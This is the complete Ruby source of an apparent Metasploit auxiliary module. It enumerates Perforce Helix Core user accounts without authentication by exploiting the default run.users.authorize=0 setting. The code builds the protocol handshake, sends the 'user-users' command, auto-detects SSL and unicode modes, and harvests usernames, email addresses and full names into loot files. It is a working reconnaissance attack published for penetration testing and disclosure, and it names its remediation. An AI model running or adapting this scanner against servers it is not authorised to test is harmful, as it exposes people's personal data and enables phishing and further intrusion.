# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/perforce'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Perforce

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Perforce Helix Core Unauthenticated User Enumeration',
        'Description' => %q{
          Enumerates user accounts from Perforce (Helix Core) servers without
          authentication by exploiting the default configuration
          (run.users.authorize=0).

          The user-users command is accessible to unauthenticated clients by
          default. This module sends the command and collects usernames, email
          addresses, and full names from the server response.

          Auto-detects SSL (TLS) and unicode server modes; no manual flags
          required.

          Affected: all Perforce server versions with default settings.

          Remediation: p4 configure set run.users.authorize=1
        },
        'Author' => ['Morgan Robertson'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://morganrobertson.net/p4wned/']
        ],
        'DisclosureDate' => '2025-04-13',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(1666),
      OptInt.new('TIMEOUT', [true, 'Connection and read timeout (seconds)', 10])
    ])
  end

  # ---------------------------------------------------------------------------
  # Query
  # ---------------------------------------------------------------------------

  # Send a user-users command and return parsed packets.
  # Returns a result hash:
  #   { packets: [], ssl_needed: bool, unicode_needed: bool, error: str|nil }
  def query_server(ip, port, use_ssl, use_unicode)
    timeout = datastore['TIMEOUT']
    port_str = use_ssl ? "ssl:#{ip}:#{port}" : "#{ip}:#{port}"

    # Standard client protocol handshake
    p1 = p4_build_packet([
      ['cmpfile', ''], ['altSync', ''], ['client', '76'], ['api', '99999'],
      ['enableStreams', ''], ['enableGraph', ''], ['expandAndmaps', ''], ['chunking', ''],
      ['host', 'localhost'], ['port', port_str], ['sndbuf', '1969919'], ['rcvbuf', '98304'],
      ['autoTune', '1'], ['func', 'protocol']
    ])

    # user-users: list all user accounts (no authentication required by default)
    p2_params = [
      ['version', '2024.2/LINUX26X86_64/2697822'], ['autoLogin', ''], ['prog', 'p4'],
      ['client', 'localhost'], ['cwd', '/tmp'], ['host', 'localhost'],
      ['os', 'UNIX'], ['locale', 'C'], ['user', 'temp']
    ]
    p2_params << ['unicode', ''] if use_unicode
    p2_params += [
      ['charset', '1'], ['utf8bom', '1'], ['clientCase', '0'], ['func', 'user-users']
    ]

    payload = p1 + p4_build_packet(p2_params)
    release = p4_build_packet([['func', 'release']])

    begin
      sock = p4_connect(ip, port, use_ssl, timeout)
    rescue Rex::ConnectionError, Rex::ConnectionTimeout => e
      return { packets: [], ssl_needed: false, unicode_needed: false, error: e.message }
    end

    begin
      sock.put(payload)
      raw = p4_recv_response(sock, timeout)
    rescue ::EOFError, ::Errno::ECONNRESET => e
      begin
        sock.close
      rescue StandardError
        nil
      end
      return { packets: [], ssl_needed: false, unicode_needed: false, error: e.message }
    end

    if p4_tls_required?(raw, use_ssl)
      begin
        sock.close
      rescue StandardError
        nil
      end
      return { packets: [], ssl_needed: true, unicode_needed: false, error: nil }
    end

    begin
      sock.put(release)
    rescue StandardError
      nil
    end
    begin
      sock.close
    rescue StandardError
      nil
    end

    packets = p4_parse_response(raw)

    return { packets: [], ssl_needed: true, unicode_needed: false, error: nil } if p4_ssl_error_in_packets?(packets)
    return { packets: [], ssl_needed: false, unicode_needed: true, error: nil } if p4_unicode_error_in_packets?(packets)

    { packets: packets, ssl_needed: false, unicode_needed: false, error: nil }
  end

  # ---------------------------------------------------------------------------
  # Scanner entry point
  # ---------------------------------------------------------------------------

  def run_host(ip)
    port = datastore['RPORT']

    result = query_server(ip, port, false, false)
    use_ssl = false

    if result[:ssl_needed]
      result = query_server(ip, port, true, false)
      use_ssl = true
    end

    if result[:error] && result[:packets].empty?
      vprint_error("#{Rex::Socket.to_authority(ip, port)} - #{result[:error]}")
      return
    end

    result = query_server(ip, port, use_ssl, true) if result[:unicode_needed]

    # user-users response: each user is a client-Message packet with
    # 'user', 'email', and 'fullName' fields (untagged output, lowercase keys)
    users = result[:packets].select do |pkt|
      pkt['func']&.b == 'client-Message'.b && pkt['user'] && pkt['email']
    end

    if users.empty?
      vprint_status(
        "#{Rex::Socket.to_authority(ip, port)} - " \
        'No users returned (run.users.authorize may be set)'
      )
      return
    end

    proto = use_ssl ? 'ssl' : 'tcp'

    report_service(
      host: ip,
      port: port,
      proto: 'tcp',
      name: 'perforce',
      info: "Perforce Helix Core (#{proto})"
    )

    report_vuln(
      host: ip,
      port: port,
      name: 'Perforce Unauthenticated User Enumeration',
      info: "#{users.length} user account(s) enumerated without authentication. " \
            'Set run.users.authorize=1 to require authentication.',
      refs: references
    )

    loot_lines = users.map do |u|
      user = u['user'].to_s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)
      email = u['email'].to_s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)
      full_name = u['fullName'].to_s.encode('UTF-8', 'binary', invalid: :replace, undef: :replace)
      "#{user} <#{email}> \"#{full_name}\""
    end

    store_loot(
      'perforce.users',
      'text/plain',
      ip,
      loot_lines.join("\n"),
      'perforce_users.txt',
      'Perforce user accounts (username, email, full name)'
    )

    loot_lines.each do |line|
      print_good("#{Rex::Socket.to_authority(ip, port)} [#{proto}] #{line}")
    end

    print_status(
      "#{Rex::Socket.to_authority(ip, port)} - #{users.length} user(s) stored to loot"
    )
  end
end
